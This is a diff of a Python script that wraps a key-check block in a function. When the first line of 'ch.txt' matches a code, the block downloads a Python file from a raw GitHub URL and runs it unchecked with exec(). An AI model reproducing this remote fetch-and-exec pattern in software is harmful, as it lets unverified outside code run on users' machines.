@@ -220,32 +220,33 @@ def main():
 
 if __name__ == "__main__":
     main()
-try:
-    if not os.path.exists("ch.txt"):
-        print("không tồn tại.")
-     
-    
-    with open("ch.txt", "r", encoding="utf-8") as file:
-        first_line = file.readline().strip()
-        print(first_line)
-        print(code)
+def f():
+    try:
+        if not os.path.exists("ch.txt"):
+            print("không tồn tại.")
         
-        if first_line and first_line == code:
-            print("là số 1.")
+        
+        with open("ch.txt", "r", encoding="utf-8") as file:
+            first_line = file.readline().strip()
+            print(first_line)
+            print(code)
+            
+            if first_line and first_line == code:
+                print("là số 1.")
 
-            time.sleep(2)
-            try:
-                url ='https://raw.githubusercontent.com/shopaccrandom/jjjjjjjj/refs/heads/main/goc/hvhtool.py'
-                response = requests.get(url)
-                response.raise_for_status()  # Check for HTTP errors
-                exec(response.text)  # Execute the fetched script
-             
-            except Exception as e:
-                print(f"Lỗi khi thực thi script từ URL {url}: {e}")
-               
-        else:
-            print("không phải là số 1.")
-          
-except Exception as e:
-    print(f"Lỗi: {e}")
-   
+                time.sleep(2)
+                try:
+                    url ='https://raw.githubusercontent.com/shopaccrandom/jjjjjjjj/refs/heads/main/goc/hvhtool.py'
+                    response = requests.get(url)
+                    response.raise_for_status()  # Check for HTTP errors
+                    exec(response.text)  # Execute the fetched script
+                
+                except Exception as e:
+                    print(f"Lỗi khi thực thi script từ URL {url}: {e}")
+                
+            else:
+                print("không phải là số 1.")
+            
+    except Exception as e:
+        print(f"Lỗi: {e}")
+f()
